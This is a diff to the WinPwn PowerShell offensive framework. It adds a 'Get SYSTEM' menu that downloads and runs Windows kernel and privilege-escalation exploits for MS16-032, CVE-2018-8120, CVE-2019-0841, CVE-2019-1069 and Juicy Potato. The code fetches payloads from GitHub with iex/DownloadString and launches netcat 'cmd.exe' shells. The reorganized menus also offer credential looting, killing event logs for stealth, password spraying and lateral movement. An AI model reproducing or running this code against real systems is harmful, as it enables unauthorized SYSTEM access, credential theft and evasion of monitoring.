@@ -153,7 +153,7 @@ __        ___       ____
                 4{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/SharpWeb.exe -argument1 all >> $currentPath\Exploitation\Browsercredentials.txt}
                 5{Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'; if (isadmin){Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/SharpUp.exe -argument1 audit >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/SharpUp.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt;} }
                 6{if (isadmin){Write-Host -ForegroundColor Yellow 'Safetykatz ftw. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/SafetyKatz.exe >> $currentPath\Exploitation\SafetyCreds.txt}}
-                7{Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt; If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-0841 : VULNERABLE"){if(!(Test-Path -Path C:\temp\)){mkdir C:\temp};[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe -Outfile C:\temp\nc.exe; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/privesc.exe -argument1 license.rtf; Start-Sleep -Seconds 3; cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 2000}}If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-1069 : VULNERABLE"){sharpcradle -polar $true;return;}; If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-1129 : VULNERABLE"){sharpcradle -polar $true;return;};}
+                7{Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt; If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-0841 : VULNERABLE"){testtemp;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe -Outfile C:\temp\nc.exe; Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/privesc.exe -argument1 license.rtf; Start-Sleep -Seconds 3; cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 2000}}If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-1069 : VULNERABLE"){sharpcradle -polar $true;return;}; If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-1129 : VULNERABLE"){sharpcradle -polar $true;return;};}
             }
         }
         While ($masterquestion -ne 8)
@@ -515,6 +515,168 @@ function dumplsass
 	}
     }
     else{Write-Host "No Admin rights, start again using a privileged session!"}
+}
+
+function kernelexploits
+{
+<#
+        .DESCRIPTION
+        Get a SYSTEM Shell using Kernel exploits.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #Exploitation
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    @'
+
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+
+   --> Get System
+
+'@
+        
+    do
+    {
+        Write-Host "================ WinPwn ================"
+        Write-Host -ForegroundColor Green '1. MS16-032!'
+        Write-Host -ForegroundColor Green '2. MS16-135! '
+        Write-Host -ForegroundColor Green '3. CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1! '
+        Write-Host -ForegroundColor Green '4. CVE-2019-0841 - April 2019!'
+        Write-Host -ForegroundColor Green '5. CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019! '
+        Write-Host -ForegroundColor Green '6. CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019! '
+        Write-Host -ForegroundColor Green '7. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
+        Write-Host -ForegroundColor Green '8. Exit. '
+        Write-Host "================ WinPwn ================"
+        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+
+        Switch ($masterquestion) 
+        {
+             1{ms16-32}
+             2{ms16-135}
+             3{CVE-2018-8120}
+             4{CVE-2019-0841}
+             5{cve-2019-1069}
+             6{CVE-2019-1129}
+             7{juicypot}
+       }
+    }
+ While ($masterquestion -ne 8)
+
+}
+
+function testtemp
+{
+ if(!(Test-Path -Path C:\temp\))
+ {
+    mkdir C:\temp
+ }
+}
+
+function juicypot
+{
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    testtemp
+    Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
+    if ([Environment]::Is64BitProcess)
+    {
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/juicypotato64.ps1')
+        Invoke-JuicyPotato -Command "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
+    }
+    else
+    {
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/invoke-juicypotato.ps1')
+        Invoke-JuicyPotato -Command "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
+    }
+    Start-Sleep -Seconds 3
+    cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
+}
+
+function CVE-2018-8120
+{
+    testtemp
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
+    if ([Environment]::Is64BitProcess)
+    {
+        Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/2018-8120.exe" -Outfile C:\temp\exp.exe
+    }
+    else
+    {
+        Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/2018-8120x86.exe" -Outfile C:\temp\exp.exe
+    }
+    C:\temp\exp.exe "C:\temp\nc.exe 127.0.0.1 4444 -e cmd.exe"
+    Start-Sleep -Seconds 4
+    cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 4444}
+}
+
+function CVE-2019-0841
+{
+    testtemp
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
+    Invoke-Sharpcradle -uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/privesc.exe" -argument1 license.rtf
+    Start-Sleep -Seconds 3
+    cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 2000}
+}
+function CVE-2019-1129
+{
+    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
+	Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
+	Start-Sleep -Seconds 15
+	Write-Host 'Next Try..'
+	Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
+	Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
+	Start-Sleep -Seconds 15
+}
+
+function CVE-2019-1069
+{
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
+    	$polaraction = Read-Host -Prompt 'Do you have a valid username and password for CVE-2019-1069?'
+	    if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
+	    {
+		    $username = Read-Host -Prompt 'Please enter the username'
+		    $password = Read-Host -Prompt 'Please enter the password'
+		    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+		    Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
+		    Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
+		    Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
+		
+		    if ([Environment]::Is64BitProcess)
+		    {
+			    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
+			    Start-Sleep -Seconds 1.5
+			    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
+		    }
+		    else
+		    {
+			    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
+			    Start-Sleep -Seconds 1.5
+			    Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
+		    }
+		
+		    move env:USERPROFILE\Appdata\Local\temp\license.rtf C:\windows\system32\license.rtf
+		    del .\schedsvc.dll
+		    del .\schtasks.exe
+		    del C:\windows\system32\tasks\test
+	    }
+}
+
+function ms16-32
+{
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/ms16-32.ps1')
+    Invoke-MS16-032
+}
+
+function ms16-135
+{
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/ms16-135.ps1')
 }
 
 function localreconmodules
@@ -1090,32 +1252,44 @@ __        ___       ____
     {
         Write-Host "================ WinPwn ================"
         Write-Host -ForegroundColor Green '1. Collect general domain information!'
-        Write-Host -ForegroundColor Green '2. Search for potential sensitive domain share files! '
-        Write-Host -ForegroundColor Green '3. Starting ACLAnalysis for Shadow Admin detection! '
-        Write-Host -ForegroundColor Green '4. Start MS-RPRN RPC Service Scan! '
-        Write-Host -ForegroundColor Green '5. Start PowerUpSQL Checks!'
-        Write-Host -ForegroundColor Green '6. Search for MS17-10 vulnerable Windows Servers in the domain! '
-        Write-Host -ForegroundColor Green '7. Check Domain Network-Shares for cleartext passwords using passhunt.exe! '
-        Write-Host -ForegroundColor Green '8. Check domain Group policies for common misconfigurations using Grouper2! '
-        Write-Host -ForegroundColor Green '9. Search for bluekeep vulnerable Windows Systems in the domain! '
-        Write-Host -ForegroundColor Green '10. Exit. '
+        Write-Host -ForegroundColor Green '2. ADRecon Report! '
+        Write-Host -ForegroundColor Green '3. Collect Bloodhound information! '
+        Write-Host -ForegroundColor Green '4. Search for potential sensitive domain share files! '
+        Write-Host -ForegroundColor Green '5. Find some network shares without predefined filter! '
+        Write-Host -ForegroundColor Green '6. Starting ACLAnalysis for Shadow Admin detection! '
+        Write-Host -ForegroundColor Green '7. Start MS-RPRN RPC Service Scan! '
+        Write-Host -ForegroundColor Green '8. Start PowerUpSQL Checks!'
+        Write-Host -ForegroundColor Green '9. Search for MS17-10 vulnerable Windows Servers in the domain! '
+        Write-Host -ForegroundColor Green '10. Check Domain Network-Shares for cleartext passwords using passhunt.exe! '
+        Write-Host -ForegroundColor Green '11. Check domain Group policies for common misconfigurations using Grouper2! '
+        Write-Host -ForegroundColor Green '12. Search for bluekeep vulnerable Windows Systems in the domain! '
+        Write-Host -ForegroundColor Green '13. Search for potential vulnerable web apps (low hanging fruits)! '
+        Write-Host -ForegroundColor Green '14. Check remote system groups via GPO Mapping! '
+        Write-Host -ForegroundColor Green '15. Search for Systems with Admin-Access to pwn them! '
+        Write-Host -ForegroundColor Green '16. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
         Switch ($masterquestion) 
         {
              1{generaldomaininfo}
-             2{Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"}
-             3{invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'}
-             4{spoolvulnscan}
-             5{powerSQL}
-             6{MS17-10}
-             7{passhunt -domain $true}
-             8{GPOAudit}
-             9{bluekeep}
+             2{reconAD}
+             3{Sharphound}
+             4{Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"}
+             5{shareenumeration}
+             6{invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'}
+             7{spoolvulnscan}
+             8{powerSQL}
+             9{MS17-10}
+             10{passhunt -domain $true}
+             11{GPOAudit}
+             12{bluekeep}
+             13{fruit}
+             14{groupsearch}
+             15{latmov}
        }
     }
- While ($masterquestion -ne 10)
+ While ($masterquestion -ne 16)
 }
 
 function GPOAudit
@@ -2044,26 +2218,16 @@ __        ___       ____
         Write-Host -ForegroundColor Green '2. Local recon menu! '
         Write-Host -ForegroundColor Green '3. Domain recon menu! '
         Write-Host -ForegroundColor Green '4. Local privilege escalation checks! '
-        Write-Host -ForegroundColor Green '5. Kerberoasting! '
-        Write-Host -ForegroundColor Green '6. PowerUpSQL checks! '
-        Write-Host -ForegroundColor Green '7. Collect Bloodhound information! '
-        Write-Host -ForegroundColor Green '8. MS17-10 domain system scanner! '
-        Write-Host -ForegroundColor Green '9. Loot local Credentials! '
-        Write-Host -ForegroundColor Green '10. Search for Systems with Admin-Access to pwn them! '
-        Write-Host -ForegroundColor Green '11. Create an ADIDNS Wildcard! '
-        Write-Host -ForegroundColor Green '12. Sessiongopher! '
-        Write-Host -ForegroundColor Green '13. Check remote system groups via GPO Mapping! '
-        Write-Host -ForegroundColor Green '14. Kill the event log services for stealth! '
-        Write-Host -ForegroundColor Green '15. Search for passwords on this system! '
-        Write-Host -ForegroundColor Green '16. ADRecon Report! '
-        Write-Host -ForegroundColor Green '17. Search for potential vulnerable web apps (low hanging fruits)! '
-        Write-Host -ForegroundColor Green '18. Find some network shares! '
-	    Write-Host -ForegroundColor Green '19. Execute some C# Magic for Creds, Recon and Privesc!'
-	    Write-Host -ForegroundColor Green '20. Load custom C# Binaries from a webserver to Memory and execute them!'
-    	Write-Host -ForegroundColor Green '21. Do an Group Policy Audit using Grouper2!'
-	    Write-Host -ForegroundColor Green '22. DomainPasswordSpray Attacks!'
-        Write-Host -ForegroundColor Green '23. Bluekeep scanner for domain joined Windows Systems! '
-        Write-Host -ForegroundColor Green '24. Exit. '
+        Write-Host -ForegroundColor Green '5. Get SYSTEM using Windows Kernel Exploits! '
+        Write-Host -ForegroundColor Green '6. Kerberoasting! '
+        Write-Host -ForegroundColor Green '7. Loot local Credentials! '
+        Write-Host -ForegroundColor Green '8. Create an ADIDNS Wildcard! '
+        Write-Host -ForegroundColor Green '9. Sessiongopher! '
+        Write-Host -ForegroundColor Green '10. Kill the event log services for stealth! '
+	    Write-Host -ForegroundColor Green '11. Execute some C# Magic for Creds, Recon and Privesc!'
+	    Write-Host -ForegroundColor Green '12. Load custom C# Binaries from a webserver to Memory and execute them!'
+	    Write-Host -ForegroundColor Green '13. DomainPasswordSpray Attacks!'
+        Write-Host -ForegroundColor Green '14. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2073,28 +2237,18 @@ __        ___       ____
              2{localreconmodules}
              3{domainreconmodules}
              4{privescmodules}
-             5{kerberoasting}
-             6{powerSQL}
-             7{Sharphound}
-             8{MS17-10}
-             9{kittielocal}
-            10{latmov}
-            11{adidnswildcard}
-            12{sessionGopher}
-            13{groupsearch}
-            14{inv-phantom}
-            15{passhunt}
-            16{reconAD}
-            17{fruit}
-            18{shareenumeration}
-	    19{sharpcradle -allthosedotnet $true}
-	    20{sharpcradle}
-            21{GPOAudit}
-	    22{domainpassspray}
-            23{bluekeep}
-       }
+             5{kernelexploits}
+             6{kerberoasting}
+             7{kittielocal}
+             8{adidnswildcard}
+             9{sessionGopher}
+            10{inv-phantom}
+            11{sharpcradle -allthosedotnet $true}
+	    12{sharpcradle}
+            13{domainpassspray}
+        }
     }
- While ($masterquestion -ne 24)
+ While ($masterquestion -ne 14)
      
     
     #End
